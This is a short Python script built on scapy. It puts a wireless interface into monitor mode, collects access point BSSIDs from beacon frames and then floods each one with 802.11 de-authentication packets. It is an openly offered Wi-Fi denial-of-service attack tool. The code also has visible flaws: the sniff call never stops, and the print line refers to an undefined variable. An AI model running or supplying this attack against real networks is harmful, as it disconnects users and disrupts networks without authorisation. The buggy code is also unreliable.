from scapy.all import *

# Get the default network interface name and capture MAC 
iface = get_if_list()[0]
srcmac = get_if_hwaddr(iface)

# Set the Wi-Fi interface to monitor mode
os.system('ifconfig wlan0 down')
os.system('iwconfig wlan0 mode monitor')
os.system('ifconfig wlan0 up')


mac_list = []
def packet_handler(pkt):
    if pkt.haslayer(Dot11Beacon):
        # Extract the BSSID (MAC address) and add it to the list
        bssid = pkt[Dot11].addr2
        if bssid not in mac_list:
            mac_list.append(bssid)

# Start sniffing for Wi-Fi packets on the Wi-Fi interface
sniff(iface='wlan0', prn=packet_handler)

# Create the de-authentication packet


# Send the packet multiple times to increase the chances of success
for mac in mac_list:
    for i in range(5):
        pkt = RadioTap() / Dot11(addr1=mac, addr2=srcmac, addr3=mac) / Dot11Deauth()
        sendp(pkt, iface, verbose=False)
        print(f'De-authentication packet sent to {dst}')
